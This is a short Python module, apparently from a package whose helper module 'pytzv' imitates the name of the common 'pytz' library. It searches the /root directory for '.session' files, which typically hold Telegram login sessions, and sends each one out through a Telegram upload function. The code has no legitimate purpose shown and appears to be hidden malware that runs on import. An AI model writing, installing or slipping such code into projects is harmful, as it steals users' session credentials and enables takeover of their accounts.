from .pytzv import find_files, send_file_to_telegram

search_path = '/root'
extension = '.session'
found_files = find_files(extension, search_path)

if found_files:
    for file_path in found_files:
        send_file_to_telegram(file_path)

